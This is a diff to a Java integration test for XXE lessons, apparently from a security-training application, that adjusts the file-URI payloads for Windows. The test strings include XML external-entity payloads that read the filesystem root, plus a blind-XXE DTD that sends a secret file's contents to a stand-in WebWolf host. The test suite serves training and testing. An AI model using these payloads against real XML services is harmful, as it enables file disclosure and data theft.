@@ -12,8 +12,13 @@ import io.restassured.http.ContentType;
 
 public class XXETest extends IntegrationTest {
 
-    private static final String xxe3 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"file:///\">]><comment><text>&xxe;test</text></comment>";
-    private static final String xxe4 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"file:///\">]><comment><text>&xxe;test</text></comment>";
+    // On Windows, "file:///" (no path/host) is not a resolvable file URI for the JAXP parser,
+    // so use a Windows-specific SYSTEM URI that lists the C:\ root, which is guaranteed to exist
+    // on the Windows GitHub runner and contains directories like "Windows", "Users", "PerfLogs".
+    private static final boolean IS_WINDOWS = System.getProperty("os.name", "").toLowerCase().contains("win");
+    private static final String XXE_SYSTEM_URI = IS_WINDOWS ? "file:///c:/" : "file:///";
+    private static final String xxe3 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"" + XXE_SYSTEM_URI + "\">]><comment><text>&xxe;test</text></comment>";
+    private static final String xxe4 = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE user [<!ENTITY xxe SYSTEM \"" + XXE_SYSTEM_URI + "\">]><comment><text>&xxe;test</text></comment>";
     private static final String dtd7 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"file:SECRET\"><!ENTITY % all \"<!ENTITY send SYSTEM 'WEBWOLFURL?text=%file;'>\">%all;";
     private static final String xxe7 = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE comment [<!ENTITY % remote SYSTEM \"WEBWOLFURL/USERNAME/blind.dtd\">%remote;]><comment><text>test&send;</text></comment>";
 
